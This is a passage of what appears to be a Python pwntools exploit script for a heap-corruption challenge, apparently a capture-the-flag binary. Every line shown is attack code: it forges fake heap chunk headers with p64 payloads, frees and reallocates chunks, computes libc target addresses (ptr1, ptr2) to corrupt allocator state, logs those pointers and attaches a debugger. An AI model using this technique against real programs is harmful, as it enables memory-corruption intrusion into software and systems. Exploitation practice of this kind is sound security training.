...
payload = p64(0)*8 + p64(0x91) + p64(heap+0xb8-16)+ p64(0)
edit(1,payload)
free(2)
free(1)
add(4,0x78)
ptr1 = libc+0x242968-16
ptr2 = libc+0x242f68-16

payload = p64(ptr1) + p64(0)*7 + p64(ptr2)
add(2,0x78)
edit(2,payload)
free(4)

log.info("ptr1 @ "+str(hex(ptr1)))
log.info("ptr2 @ "+str(hex(ptr2)))
payload = "aaaaaaaa"
gdb.attach(io)
add(1,0x48)
edit(1,payload)
